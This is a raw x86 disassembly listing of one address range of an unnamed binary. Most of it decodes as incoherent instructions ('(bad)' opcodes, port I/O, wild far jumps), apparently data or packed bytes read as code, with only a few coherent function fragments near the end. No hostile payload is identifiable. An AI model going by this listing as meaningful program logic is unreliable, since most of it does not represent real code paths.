  416e42:	mov    edi,0x54a66df8
  416e47:	retf   
  416e48:	cmp    edx,DWORD PTR [ecx]
  416e4a:	pop    ecx
  416e4b:	pop    eax
  416e4c:	or     DWORD PTR [ebp-0x5e3df89],ecx
  416e52:	sbb    ebx,DWORD PTR [edx+0x5693acfd]
  416e58:	pop    ss
  416e59:	pop    ds
  416e5a:	mov    cl,0x27
  416e5c:	ror    DWORD PTR [eax-0x70],0xec
  416e60:	push   ecx
  416e61:	xor    ch,BYTE PTR [eax+0x4723514]
  416e67:	dec    edi
  416e68:	ins    BYTE PTR es:[edi],dx
  416e69:	cdq    
  416e6a:	push   edx
  416e6b:	ins    BYTE PTR es:[edi],dx
  416e6c:	add    ah,BYTE PTR [edi+0x169c8d66]
  416e72:	sub    eax,0x1d603d46
  416e77:	mov    eax,ds:0x267307a8
  416e7c:	inc    edi
  416e7d:	test   BYTE PTR [ebx],cl
  416e7f:	push   cs
  416e80:	add    DWORD PTR [edi+0x252a0201],0x12
  416e87:	xchg   ebp,eax
  416e88:	inc    edi
  416e89:	aam    0x1a
  416e8b:	(bad)  
  416e8c:	xlat   BYTE PTR ds:[ebx]
  416e8d:	xor    al,0x88
  416e8f:	adc    bl,BYTE PTR [edi+eax*2-0x71]
  416e93:	out    dx,al
  416e94:	mov    ebx,0x486548f6
  416e99:	cmp    al,0xd0
  416e9b:	jmp    0x416e96
  416e9d:	jge    0x416f01
  416e9f:	call   FWORD PTR [edx+0x87755fb]
  416ea5:	adc    bl,dl
  416ea7:	jo     0x416f10
  416ea9:	and    eax,ebx
  416eab:	imul   BYTE PTR [edx+0x1f448784]
  416eb1:	cmp    edx,ecx
  416eb3:	fs outs dx,BYTE PTR fs:[esi]
  416eb6:	in     eax,0xec
  416eb8:	push   esp
  416eb9:	jl     0x416e50
  416ebb:	loopne 0x416e84
  416ebd:	xchg   esp,eax
  416ebe:	ret    0x120d
  416ec1:	mov    bh,0xa9
  416ec3:	stc    
  416ec4:	sub    esi,DWORD PTR [esi+0x733505a2]
  416eca:	shl    DWORD PTR [ecx],0x29
  416ecd:	jp     0x416eb5
  416ecf:	shl    BYTE PTR es:[ebx],0x8b
  416ed3:	pop    ds
  416ed4:	stos   DWORD PTR es:[edi],eax
  416ed5:	mov    dh,0x9a
  416ed7:	jecxz  0x416edf
  416ed9:	mov    cl,0xa3
  416edb:	inc    ecx
  416edc:	pop    ebp
  416edd:	push   ecx
  416ede:	fdiv   st(4),st
  416ee0:	inc    ebp
  416ee1:	sub    al,0x7e
  416ee3:	jbe    0x416e99
  416ee5:	or     BYTE PTR [ebx-0x1bdc905c],cl
  416eeb:	xor    esp,edi
  416eed:	mov    ah,0x15
  416eef:	add    ecx,DWORD PTR [ebx+edi*4]
  416ef2:	and    BYTE PTR [ebx*1+0xe9908ab],ah
  416ef9:	ins    DWORD PTR es:[edi],dx
  416efa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416efb:	mov    BYTE PTR [edx-0x45],dh
  416efe:	jne    0x416ef1
  416f00:	in     al,dx
  416f01:	in     al,0x25
  416f03:	push   ecx
  416f04:	iret   
  416f05:	lds    ecx,FWORD PTR [eax-0x43]
  416f08:	mov    bl,0xa0
  416f0a:	or     ecx,esp
  416f0c:	xchg   edx,eax
  416f0d:	add    dh,BYTE PTR [edx]
  416f0f:	out    0xbc,eax
  416f11:	orps   xmm2,XMMWORD PTR [edx]
  416f14:	mov    dh,0x21
  416f16:	mov    al,0xed
  416f18:	ja     0x416e9c
  416f1a:	mov    BYTE PTR [eax-0x39765e26],bh
  416f20:	inc    ebx
  416f21:	adc    DWORD PTR [edx-0x3d],ebx
  416f24:	jl     0x416ef0
  416f26:	push   esp
  416f27:	and    DWORD PTR [ebx-0x62674e0e],ecx
  416f2d:	inc    ecx
  416f2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f2f:	mov    ch,0xac
  416f31:	(bad)  
  416f32:	push   ss
  416f33:	mov    ebp,0xf9328e41
  416f38:	jmp    0x416f77
  416f3a:	leave  
  416f3b:	and    DWORD PTR [ebx-0x5f6d6664],0x3b5bd9ab
  416f45:	inc    edx
  416f46:	or     dl,BYTE PTR [ecx]
  416f48:	and    al,0x70
  416f4a:	add    eax,0x36398f3
  416f4f:	xchg   edi,eax
  416f50:	dec    esp
  416f51:	xchg   esp,eax
  416f52:	and    DWORD PTR [ecx+0x60bdcd94],ebx
  416f58:	mov    ds:0x3c7c4e42,eax
  416f5d:	cmp    cl,dh
  416f5f:	addr16 mov dh,0xd2
  416f62:	test   al,0x2e
  416f64:	ret    0x3214
  416f67:	mov    ds:0xfd788c03,eax
  416f6c:	imul   edi,DWORD PTR [ecx],0xa7e23285
  416f72:	and    eax,0xdfef9398
  416f77:	dec    ebp
  416f78:	mov    ecx,DWORD PTR [bp+0x3b]
  416f7c:	cmp    al,0x3d
  416f7e:	cmp    BYTE PTR [esi+0x8],bl
  416f81:	jecxz  0x416f40
  416f83:	mov    ebx,0x98a20d17
  416f88:	mov    DWORD PTR [edi+0x497e94d8],esi
  416f8e:	cmp    al,0x5a
  416f90:	enter  0xd7ff,0x4e
  416f94:	fcom   QWORD PTR [ecx-0x7b]
  416f97:	mov    ebp,edx
  416f99:	mov    bl,0xc1
  416f9b:	out    0xb6,al
  416f9d:	cmp    DWORD PTR fs:[edx-0x40],ebp
  416fa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fa2:	ins    DWORD PTR es:[edi],dx
  416fa3:	jmp    0x916374b2
  416fa8:	out    0xe4,eax
  416faa:	retf   0x5d3a
  416fad:	add    ebx,ecx
  416faf:	sbb    DWORD PTR [edi-0xd77a7d1],edx
  416fb5:	in     al,0x11
  416fb7:	es test cl,ch
  416fba:	push   eax
  416fbb:	xor    BYTE PTR [eax-0x1c],bl
  416fbe:	outs   dx,BYTE PTR ds:[esi]
  416fbf:	cmp    BYTE PTR [ecx-0x80],dh
  416fc2:	inc    ecx
  416fc3:	sub    ebx,DWORD PTR [ecx+0x7a]
  416fc6:	pop    esi
  416fc7:	test   BYTE PTR [edx+0x7b43c3e6],dl
  416fcd:	idiv   DWORD PTR [eax-0x396e1ed8]
  416fd3:	lahf   
  416fd4:	inc    esp
  416fd5:	(bad)  
  416fd7:	lea    eax,[eax+0x33]
  416fda:	int3   
  416fdb:	and    esp,esp
  416fdd:	inc    eax
  416fde:	sub    DWORD PTR [ebp-0x1fa3df8a],edi
  416fe4:	fs cwde 
  416fe6:	cdq    
  416fe7:	and    DWORD PTR [ebx+0x66],eax
  416fea:	pop    esp
  416feb:	xchg   edi,eax
  416fec:	add    bh,BYTE PTR [ecx]
  416fee:	lods   eax,DWORD PTR ds:[esi]
  416fef:	adc    esp,DWORD PTR [ecx]
  416ff1:	push   ebp
  416ff2:	jbe    0x416ffe
  416ff4:	jl     0x416f8d
  416ff6:	push   0xd0ed3ebd
  416ffb:	aas    
  416ffc:	popf   
  416ffd:	clc    
  416ffe:	retf   
  416fff:	xchg   esi,eax
  417000:	xor    DWORD PTR [ecx],edi
  417002:	out    0x30,eax
  417004:	sub    al,0xb5
  417006:	bound  edx,QWORD PTR [eax+0x2d]
  417009:	fwait
  41700a:	enter  0xa48f,0x25
  41700e:	enter  0xaa7a,0x75
  417012:	or     eax,0xf954fbbb
  417017:	in     al,dx
  417018:	lds    edi,FWORD PTR [edi+0x6d]
  41701b:	mov    ebx,0xf4c28dd5
  417020:	rcl    BYTE PTR [ebx],cl
  417022:	enter  0x92ad,0x85
  417026:	jmp    0x41704e
  417028:	push   ss
  417029:	jnp    0x41703d
  41702b:	test   eax,0xee6ef93d
  417030:	ds in  al,dx
  417032:	dec    eax
  417033:	sub    esp,eax
  417035:	jbe    0x416fe8
  417037:	fcom   QWORD PTR [edx+0x4cfff92]
  41703d:	push   ebp
  41703e:	arpl   WORD PTR [ebx+0x66],bp
  417041:	jo     0x417043
  417043:	frstor [ebp+0x226f7293]
  417049:	inc    edi
  41704a:	div    dh
  41704c:	int3   
  41704d:	add    DWORD PTR [esi],esi
  41704f:	mov    cs,edx
  417051:	lahf   
  417052:	add    eax,esi
  417054:	mov    ds:0x41eb62,eax
  417059:	jmp    0x417311
  41705e:	ret    
  41705f:	xlat   BYTE PTR ds:[ebx]
  417060:	leave  
  417061:	rcr    ecx,cl
  417063:	rcr    ecx,1
  417065:	xlat   BYTE PTR ds:[ebx]
  417066:	(bad)  
  417067:	cmp    DWORD PTR [edi+0x51bec8bb],edx
  41706d:	or     al,0x45
  41706f:	sub    edi,DWORD PTR [edi+0x78]
  417072:	xchg   ebp,eax
  417073:	jle    0x4170ed
  417075:	js     0x4170bc
  417077:	shr    DWORD PTR [edx],cl
  417079:	xor    dl,BYTE PTR [edx+0x1ae38ea7]
  41707f:	push   0x5f
  417081:	in     eax,dx
  417082:	push   0xf03700d5
  417087:	ret    
  417088:	inc    edi
  417089:	jle    0x41703a
  41708b:	push   esi
  41708c:	shl    DWORD PTR [ecx+0x52cc4e2b],cl
  417092:	adc    DWORD PTR [ebx+0x68],0x74fbfa9b
  417099:	dec    ecx
  41709a:	lock xlat BYTE PTR ds:[ebx]
  41709c:	(bad)  
  41709d:	jp     0x417082
  41709f:	test   al,0x22
  4170a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170a2:	xlat   BYTE PTR ds:[ebx]
  4170a3:	mov    BYTE PTR [edi+0x4c07cbe5],0x4b
  4170aa:	iret   
  4170ab:	sub    ch,dh
  4170ad:	fdivr  st,st(5)
  4170af:	test   DWORD PTR [ebp-0x6f22c802],0x2af52f51
  4170b9:	mov    cl,0x22
  4170bb:	and    eax,0x3f6cf154
  4170c0:	or     ebp,esi
  4170c2:	add    BYTE PTR [ebx-0x648eb63f],0xd3
  4170c9:	jno    0x417143
  4170cb:	cwde   
  4170cc:	stos   BYTE PTR es:[edi],al
  4170cd:	shl    BYTE PTR [eax],cl
  4170cf:	push   edi
  4170d0:	addr16 mov bh,0xeb
  4170d3:	leave  
  4170d4:	rcr    DWORD PTR [edi-0x2d],0x35
  4170d8:	pusha  
  4170d9:	shl    DWORD PTR [edi+0x72],cl
  4170dc:	jae    0x4170c5
  4170de:	test   DWORD PTR [edx+ecx*1-0x64801a76],edx
  4170e5:	sbb    eax,0xa7eff988
  4170ea:	push   0x8ae76ea2
  4170ef:	sbb    al,0xcf
  4170f1:	cwde   
  4170f2:	inc    edx
  4170f3:	iret   
  4170f4:	repz retf 
  4170f6:	inc    ecx
  4170f7:	daa    
  4170f8:	dec    ebx
  4170f9:	inc    esp
  4170fa:	inc    esi
  4170fb:	mov    esi,0x2e0266f2
  417100:	repz pop esi
  417102:	in     al,dx
  417103:	imul   edx,DWORD PTR [ecx+0x14],0x4e399816
  41710a:	add    BYTE PTR [eax+0x7],ah
  41710d:	sbb    eax,0x2f79a227
  417112:	or     dl,dh
  417114:	iret   
  417115:	loop   0x417131
  417117:	sub    BYTE PTR [esi-0x16],0x70
  41711b:	jmp    0x5c77:0xb788dc65
  417122:	daa    
  417123:	jnp    0x4170a8
  417125:	and    edx,DWORD PTR ds:0x75e590b3
  41712b:	scas   al,BYTE PTR es:[edi]
  41712c:	in     al,0x15
  41712e:	jmp    0x1f01:0xa11e6aa
  417135:	add    ebx,DWORD PTR [ecx]
  417137:	test   BYTE PTR [esi],0xa3
  41713a:	aam    0x18
  41713c:	sbb    ebx,DWORD PTR [ebp-0x481b31ee]
  417142:	xchg   BYTE PTR [eax],bl
  417144:	mov    dh,0xf3
  417146:	shl    BYTE PTR [eax+0x48],cl
  417149:	cmp    DWORD PTR [ecx],ebx
  41714b:	mov    edi,0xf9ef2de9
  417150:	xchg   ebp,eax
  417151:	add    eax,0xf7174061
  417156:	mov    eax,0xc7354491
  41715b:	cdq    
  41715c:	es cwde 
  41715e:	jg     0x4171de
  417160:	inc    eax
  417161:	xchg   BYTE PTR [ecx-0x8e27328],ch
  417167:	jbe    0x4171ba
  417169:	sub    esi,ebx
  41716b:	imul   ch
  41716d:	jb     0x4170fa
  41716f:	out    dx,eax
  417170:	sub    esi,DWORD PTR [ecx+0x3a967a8]
  417176:	pop    esp
  417177:	loop   0x4171a2
  417179:	dec    edx
  41717a:	call   0x1bd6a57a
  41717f:	pop    edx
  417180:	xchg   esp,eax
  417181:	imul   eax,DWORD PTR [edi+0x77],0x8
  417185:	push   ds
  417186:	mov    bh,BYTE PTR [esi+0x1831e2d8]
  41718c:	add    edx,DWORD PTR [esi+0x4e0f39e9]
  417192:	mov    esp,eax
  417194:	lods   al,BYTE PTR ds:[esi]
  417195:	jo     0x41711d
  417197:	es xor al,0x1a
  41719a:	jle    0x4171ab
  41719c:	aas    
  41719d:	out    dx,eax
  41719e:	add    BYTE PTR [ecx-0x6b4252ac],dl
  4171a4:	ret    
  4171a5:	out    0x47,al
  4171a7:	cwde   
  4171a8:	cld    
  4171a9:	inc    BYTE PTR [ecx+0x2a]
  4171ac:	iret   
  4171ad:	mov    ebx,0x29b952a4
  4171b2:	sbb    ebp,DWORD PTR [esi+0x6f]
  4171b5:	dec    esi
  4171b6:	jae    0x4171c9
  4171b8:	adc    edx,ebx
  4171ba:	dec    esi
  4171bb:	or     dl,dh
  4171bd:	mov    ebp,0xb77b3161
  4171c2:	in     al,0x9f
  4171c4:	push   ds
  4171c5:	(bad)  
  4171c6:	ficom  WORD PTR [edx+0x379a002f]
  4171cc:	push   eax
  4171cd:	mov    DWORD PTR [esi],esi
  4171cf:	mov    ecx,0x96066380
  4171d4:	test   eax,0x2373caaa
  4171d9:	retf   0xf38a
  4171dc:	cs popf 
  4171de:	shl    DWORD PTR es:0x342acaa1,cl
  4171e5:	and    eax,0xe1f74157
  4171ea:	xor    al,0x16
  4171ec:	dec    ecx
  4171ed:	jns    0x4171f7
  4171ef:	push   ecx
  4171f0:	fimul  DWORD PTR [edx]
  4171f2:	lods   al,BYTE PTR ds:[esi]
  4171f3:	test   eax,edi
  4171f5:	jle    0x4171ea
  4171f7:	cmp    BYTE PTR [ebx-0x5],bh
  4171fa:	das    
  4171fb:	syscall 
  4171fd:	inc    ebx
  4171fe:	fcmovne st,st(1)
  417200:	xor    BYTE PTR [edi],bh
  417202:	mov    dl,0xbf
  417204:	nop
  417205:	stc    
  417206:	pop    esp
  417207:	shr    bh,1
  417209:	in     al,dx
  41720a:	cmp    esi,esi
  41720c:	sub    bh,0x8
  41720f:	ins    DWORD PTR es:[edi],dx
  417210:	jmp    0x501c4e40
  417215:	in     al,0x1f
  417217:	rcr    dl,1
  417219:	mov    eax,ds:0xa53cdb1c
  41721e:	stc    
  41721f:	pop    es
  417220:	sub    edi,esi
  417222:	mov    ebx,0x790d0f66
  417227:	loope  0x417215
  417229:	repnz xor BYTE PTR [edx-0x6bac1752],bl
  417230:	out    dx,al
  417231:	push   eax
  417232:	vmptrld QWORD PTR [esi]
  417235:	cmp    bl,ch
  417237:	add    BYTE PTR [eax-0x98a70ed],0x8c
  41723e:	jle    0x417216
  417240:	lea    ecx,[eax+0x11]
  417243:	mov    ecx,DWORD PTR [eax-0x68c39c04]
  417249:	and    DWORD PTR [edx],ebp
  41724b:	or     eax,0xaf9af0e6
  417250:	daa    
  417251:	xor    BYTE PTR [eax-0x5f8a9eef],ah
  417257:	stos   BYTE PTR es:[edi],al
  417258:	es test al,0x7b
  41725b:	mov    BYTE PTR [edx-0x2a],al
  41725e:	(bad)  
  41725f:	out    dx,eax
  417260:	push   0x3d73464e
  417265:	call   0x3af9:0x613dba8a
  41726c:	dec    esp
  41726d:	int3   
  41726e:	(bad)  
  41726f:	mov    edx,0xc8064e02
  417274:	pusha  
  417275:	cs dec edi
  417277:	stos   DWORD PTR es:[edi],eax
  417278:	cmc    
  417279:	adc    eax,DWORD PTR [eax+0x5c]
  41727c:	sbb    DWORD PTR [ebx+0x2d],edi
  41727f:	inc    esp
  417280:	xchg   DWORD PTR [ebx+0x7c],esi
  417283:	clc    
  417284:	addps  xmm6,xmm0
  417287:	or     esi,DWORD PTR [ecx+eax*4-0x68]
  41728b:	jb     0x417237
  41728d:	or     BYTE PTR [edi+0x3a],ch
  417290:	sbb    BYTE PTR [ebx],bh
  417292:	cmp    DWORD PTR [edi-0x7aa2593],edi
  417298:	int    0x23
  41729a:	inc    edi
  41729b:	xchg   bl,cl
  41729d:	test   DWORD PTR [eax],esp
  41729f:	in     eax,dx
  4172a0:	push   0xffffffb4
  4172a2:	push   edi
  4172a3:	je     0x417324
  4172a5:	loope  0x4172b4
  4172a7:	push   edi
  4172a8:	in     eax,0x4c
  4172aa:	and    BYTE PTR [eax],bl
  4172ac:	cmp    al,bh
  4172ae:	in     al,dx
  4172af:	add    al,0x7a
  4172b1:	add    al,0x15
  4172b3:	fmul   DWORD PTR [edx]
  4172b5:	push   esp
  4172b6:	cld    
  4172b7:	ja     0x41729f
  4172b9:	jg     0x4172ee
  4172bb:	fild   QWORD PTR [ecx+0x497d0a34]
  4172c1:	stc    
  4172c2:	cmp    eax,0xcba836bf
  4172c7:	and    ebx,DWORD PTR [ebx-0x31fb7316]
  4172cd:	nop    DWORD PTR [ecx]
  4172d0:	rcr    DWORD PTR [ebp+0x2ca5fe6d],1
  4172d6:	mov    ebp,DWORD PTR [eax-0x19]
  4172d9:	in     eax,0x9c
  4172db:	lahf   
  4172dc:	ins    DWORD PTR es:[edi],dx
  4172dd:	popf   
  4172de:	cli    
  4172df:	cmp    eax,0xeac224b1
  4172e4:	loopne 0x417295
  4172e6:	cmp    ebx,DWORD PTR [edx+eax*8+0x48]
  4172ea:	ret    
  4172eb:	in     eax,dx
  4172ec:	cmp    BYTE PTR [esp+esi*1+0x5f],ah
  4172f0:	or     BYTE PTR [ecx],ah
  4172f2:	push   0x48252c58
  4172f7:	xor    eax,0x21172bb8
  4172fc:	push   ecx
  4172fd:	fiadd  DWORD PTR [ebx-0x17f6f85]
  417303:	push   eax
  417304:	xchg   edi,eax
  417305:	push   es
  417306:	ja     0x417377
  417308:	mov    fs,WORD PTR [ecx+ebp*4]
  41730b:	pop    ecx
  41730c:	pop    edi
  41730d:	iret   
  41730e:	and    ebp,DWORD PTR [edx]
  417310:	cdq    
  417311:	push   DWORD PTR [ebp-0x8]
  417314:	push   DWORD PTR [ebp-0x4]
  417317:	call   0x40cf9c
  41731c:	mov    eax,DWORD PTR [ebp-0x4]
  41731f:	xor    eax,edi
  417321:	pop    edi
  417322:	jmp    0x4175da
  417327:	rcl    bl,cl
  417329:	rcl    esi,cl
  41732b:	rcl    esi,1
  41732d:	(bad)  
  41732f:	and    esi,DWORD PTR [ebp+0x49]
  417332:	rcl    BYTE PTR [edi],1
  417334:	jnp    0x41735b
  417336:	out    0xe2,eax
  417338:	sub    BYTE PTR [edi+0x78],bh
  41733b:	xchg   ebp,eax
  41733c:	jle    0x4173b6
  41733e:	js     0x4173a1
  417340:	fmul   QWORD PTR [esi+0xe16d65b]
  417346:	jmp    0x41733d
  417348:	lods   al,BYTE PTR ds:[esi]
  417349:	out    dx,al
  41734a:	or     al,0xb4
  41734c:	rol    BYTE PTR [edx+0x21],1
  41734f:	mov    esp,0x6ab27b6
  417354:	sbb    dh,BYTE PTR [ebp-0x7034d06e]
  41735a:	iret   
  41735b:	ret    0xd949
  41735e:	push   esi
  41735f:	out    dx,eax
  417360:	in     eax,0xd9
  417362:	jo     0x4172f1
  417364:	sbb    edi,DWORD PTR [eax+0x68]
  417367:	jb     0x41732d
  417369:	data16 shr BYTE PTR [eax+0x13],1
  41736d:	adc    ecx,edx
  41736f:	ret    
  417370:	and    eax,0x9106ff9
  417375:	and    eax,0x9cecffde
  41737a:	mov    ebp,0x7101e8d6
  41737f:	mov    eax,ds:0x4ff4f36a
  417384:	pop    esi
  417385:	rcr    BYTE PTR [ecx+edi*4],1
  417388:	or     al,0x92
  41738a:	ds mov bh,bl
  41738d:	test   DWORD PTR [eax+eiz*2+0x227865e3],edx
  417394:	and    esi,DWORD PTR [eax+0x9]
  417397:	add    edi,DWORD PTR [ecx+edi*8+0x5b]
  41739b:	shl    BYTE PTR [edi],0x7b
  41739e:	jne    0x4173e3
  4173a0:	adc    ebx,esi
  4173a2:	add    dl,BYTE PTR ds:0x6e5de265
  4173a8:	ins    DWORD PTR es:[edi],dx
  4173a9:	sub    DWORD PTR [edi+ecx*2],ebx
  4173ac:	sub    BYTE PTR ds:[eax],ch
  4173af:	adc    dh,BYTE PTR [edx]
  4173b1:	fwait
  4173b2:	outs   dx,DWORD PTR ds:[esi]
  4173b3:	sub    DWORD PTR [ebx-0x45],0x4e
  4173b7:	ret    0x2713
  4173ba:	dec    ecx
  4173bb:	leave  
  4173bc:	pushf  
  4173bd:	(bad)  
  4173be:	or     al,0x98
  4173c0:	div    DWORD PTR [edi+ecx*4-0x77]
  4173c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173c5:	fisttp QWORD PTR [ebx-0x27]
  4173c8:	loope  0x4173a8
  4173ca:	jl     0x417387
  4173cc:	addr16 pop ds
  4173ce:	aaa    
  4173cf:	hlt    
  4173d0:	pop    esp
  4173d1:	mov    dl,0xa4
  4173d3:	xor    bh,BYTE PTR [ecx+0x69]
  4173d6:	mov    eax,ds:0x53508647
  4173db:	in     al,0x59
  4173dd:	rol    edi,1
  4173df:	mov    ch,dh
  4173e1:	mov    al,ds:0x4ea255b3
  4173e6:	pop    eax
  4173e7:	jmp    0x3a21:0xab331a29
  4173ee:	adc    cl,0x99
  4173f1:	mov    eax,ds:0x1c25a868
  4173f6:	cmp    BYTE PTR [ebp-0x44],ch
  4173f9:	pushf  
  4173fa:	mov    bl,0xdb
  4173fc:	test   DWORD PTR [eax+0x5f],esi
  4173ff:	imul   ebx,DWORD PTR [ebp+0x26f7caa5],0xffffffd2
  417406:	dec    ecx
  417407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417408:	aas    
  417409:	adc    BYTE PTR fs:[eax],dh
  41740c:	adc    eax,0x865904ab
  417411:	call   FWORD PTR [edi]
  417413:	bound  esi,QWORD PTR [edx]
  417415:	call   FWORD PTR [ebp+0x3c]
  417418:	adc    DWORD PTR [edx+0x43],esp
  41741b:	push   ss
  41741c:	pop    edx
  41741d:	out    dx,al
  41741e:	sub    ebx,DWORD PTR [edx+0x11]
  417421:	mov    fs,WORD PTR [edx+esi*2-0x6e]
  417425:	sbb    bl,ah
  417427:	sub    al,0x6b
  417429:	retf   0xf2b7
  41742c:	or     eax,0x3d23380c
  417431:	sub    cl,BYTE PTR [ebx]
  417433:	inc    edi
  417434:	mov    edi,es
  417436:	dec    ecx
  417437:	(bad)  
  417438:	loope  0x4173e6
  41743a:	jae    0x4173e4
  41743c:	mov    ebx,0x7b3e0861
  417441:	inc    esi
  417442:	or     ebx,0xdef912b2
  417448:	repz add esi,DWORD PTR [ebp+0xeef784a]
  41744f:	jne    0x41740c
  417451:	(bad)  
  417452:	hlt    
  417453:	dec    edi
  417454:	imul   ebx,DWORD PTR [ebp-0x459539c7],0x9853965d
  41745e:	enter  0xd56d,0x39
  417462:	jo     0x41741a
  417464:	je     0x4173f7
  417466:	jg     0x41744c
  417468:	div    DWORD PTR [esi-0xf]
  41746b:	iret   
  41746c:	shr    BYTE PTR [ecx+0x42],cl
  41746f:	mov    es,WORD PTR [ecx+esi*4+0x6aa5b738]
  417476:	loopne 0x417498
  417478:	dec    esi
  417479:	pop    ebx
  41747a:	xchg   edx,eax
  41747b:	shr    dh,cl
  41747d:	xlat   BYTE PTR ds:[ebx]
  41747e:	xchg   esp,eax
  41747f:	jnp    0x417486
  417481:	jmp    0x4174eb
  417483:	retf   0x1cf8
  417486:	icebp  
  417487:	fwait
  417488:	loope  0x4174c6
  41748a:	pop    ss
  41748b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41748c:	push   0x18
  41748e:	jmp    0x95e25894
  417493:	add    DWORD PTR [edx+eax*2+0x10e64f7],ebx
  41749a:	je     0x417498
  41749c:	ja     0x4174ce
  41749e:	add    esi,DWORD PTR [edi+0x4a]
  4174a1:	xchg   edx,eax
  4174a2:	pop    ss
  4174a3:	dec    ecx
  4174a4:	xchg   ebx,eax
  4174a5:	stc    
  4174a6:	(bad)  
  4174a8:	in     eax,dx
  4174a9:	dec    edi
  4174aa:	gs sbb ebx,esi
  4174ad:	sub    eax,DWORD PTR [eax+0x2f]
  4174b0:	sbb    BYTE PTR [ecx-0x6d],0x11
  4174b4:	sub    ebx,DWORD PTR [ebp+eiz*2-0x3b]
  4174b8:	lods   eax,DWORD PTR ds:[esi]
  4174b9:	lds    edi,FWORD PTR [edi]
  4174bb:	pop    eax
  4174bc:	mov    esi,0x938c6cb4
  4174c1:	add    ebx,0x8dad8668
  4174c7:	sbb    BYTE PTR [edi-0x17],bh
  4174ca:	jle    0x4174af
  4174cc:	push   esp
  4174cd:	jg     0x41746e
  4174cf:	inc    eax
  4174d0:	mov    dh,0x21
  4174d2:	adc    BYTE PTR [edx-0x193014e5],0x61
  4174d9:	mov    bh,0xef
  4174db:	or     eax,0xf9b1cb40
  4174e0:	loop   0x4174e0
  4174e2:	dec    edx
  4174e3:	inc    eax
  4174e4:	push   edx
  4174e5:	pop    ebp
  4174e6:	adc    DWORD PTR [edi],0x5c
  4174e9:	jae    0x4174dc
  4174eb:	out    dx,al
  4174ec:	ins    DWORD PTR es:[edi],dx
  4174ed:	arpl   WORD PTR [esi],di
  4174ef:	ins    DWORD PTR es:[edi],dx
  4174f0:	mov    esi,0x5d0ded73
  4174f5:	add    eax,0x1ec8b19f
  4174fa:	mov    esi,ecx
  4174fc:	xchg   edx,eax
  4174fd:	fist   DWORD PTR [edx]
  4174ff:	in     al,dx
  417500:	jmp    0xc4eae76b
  417505:	out    0x6d,eax
  417507:	fcom   DWORD PTR [ebx+0x4a5f7e3c]
  41750d:	fyl2xp1 
  41750f:	cmp    dl,BYTE PTR [eax]
  417511:	jl     0x4174fc
  417513:	inc    esi
  417514:	inc    esi
  417515:	sbb    BYTE PTR [edi-0xf5d1a37],dh
  41751b:	shl    BYTE PTR ds:0x28df0033,1
  417521:	call   0x472:0xb1804
  417528:	xor    ebp,eax
  41752a:	sti    
  41752b:	pushf  
  41752c:	loop   0x417540
  41752e:	mov    ch,0xd7
  417530:	mov    ds:0x533d6514,eax
  417535:	xchg   ecx,eax
  417536:	shr    BYTE PTR [edi],0xf
  417539:	mov    cl,0x90
  41753b:	xchg   BYTE PTR [edx-0x1d],dl
  41753e:	pop    esp
  41753f:	sbb    BYTE PTR [ebx],dl
  417541:	cmp    eax,0x7db93992
  417546:	loopne 0x4174e0
  417548:	sar    BYTE PTR [ebx-0x66],cl
  41754b:	stmxcsr DWORD PTR [ebx-0x67]
  41754f:	lods   eax,DWORD PTR ds:[esi]
  417550:	out    dx,al
  417551:	cmp    ebp,ecx
  417553:	mov    ?,ecx
  417555:	call   FWORD PTR [edi+eiz*1+0x287df088]
  41755c:	mov    ch,0x4e
  41755e:	fs xor eax,0xf93635cc
  417564:	push   ss
  417565:	jbe    0x417509
  417567:	add    al,dl
  417569:	(bad)  
  41756a:	lds    ecx,FWORD PTR [ebp+0x2a]
  41756d:	dec    ecx
  41756e:	cmp    eax,0x9a2d2f39
  417573:	stos   BYTE PTR es:[edi],al
  417574:	es sub eax,0xf9afb4f3
  41757a:	(bad)  
  41757c:	push   ds
  41757d:	fist   WORD PTR [esi]
  41757f:	(bad)  
  417580:	icebp  
  417581:	test   BYTE PTR [esi+edi*2],al
  417584:	das    
  417585:	dec    esi
  417586:	mov    edx,0xdcc6835d
  41758b:	jno    0x4175f3
  41758d:	lods   eax,DWORD PTR ds:[esi]
  41758e:	xor    al,0xef
  417590:	push   ds
  417591:	jmp    0x4a1ee282
  417596:	in     eax,dx
  417597:	add    BYTE PTR [edx-0x7],dh
  41759a:	cmp    dl,al
  41759c:	push   0x20
  41759e:	out    dx,eax
  41759f:	xchg   DWORD PTR [edx+0x59],ebx
  4175a2:	lods   al,BYTE PTR ds:[esi]
  4175a3:	mov    al,0xf8
  4175a5:	scas   eax,DWORD PTR es:[edi]
  4175a6:	adc    edx,ecx
  4175a8:	dec    esp
  4175a9:	xchg   ecx,eax
  4175aa:	call   0x1b94fb43
  4175af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175b0:	add    DWORD PTR [edi-0x77],esp
  4175b3:	sub    BYTE PTR [esi+eiz*8+0x5d9fdb0d],bl
  4175ba:	cdq    
  4175bb:	and    DWORD PTR [esi+0x42],esi
  4175be:	mov    es,ebx
  4175c0:	outs   dx,DWORD PTR ds:[esi]
  4175c1:	out    dx,al
  4175c2:	xchg   DWORD PTR [ebx],esi
  4175c4:	sbb    esp,ecx
  4175c6:	mov    ah,0xc0
  4175c8:	xlat   BYTE PTR ds:[ebx]
  4175c9:	(bad)  
  4175ca:	mov    bl,0x41
  4175cc:	push   eax
  4175cd:	call   0x5491db78
  4175d2:	jle    0x417632
  4175d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175d5:	mov    ebp,0x57abb5bf
  4175da:	add    eax,esi
  4175dc:	pop    esi
  4175dd:	leave  
  4175de:	ret    0xc
  4175e1:	push   ebp
  4175e2:	mov    ebp,esp
  4175e4:	push   ecx
  4175e5:	mov    DWORD PTR ds:0x42a879,0x1f
  4175ef:	cmp    DWORD PTR ds:0x42a879,0x0
  4175f6:	je     0x41764a
  4175fc:	cmp    DWORD PTR ds:0x42a879,0x5
  417603:	jne    0x417621
  417609:	push   0x42a7b9
  41760e:	push   0x42a805
  417613:	push   DWORD PTR [ebp-0x14]
  417616:	push   0x42a952
  41761b:	call   DWORD PTR ds:0x41d10c
  417621:	cmp    DWORD PTR ds:0x42a879,0x6
  417628:	jne    0x417639
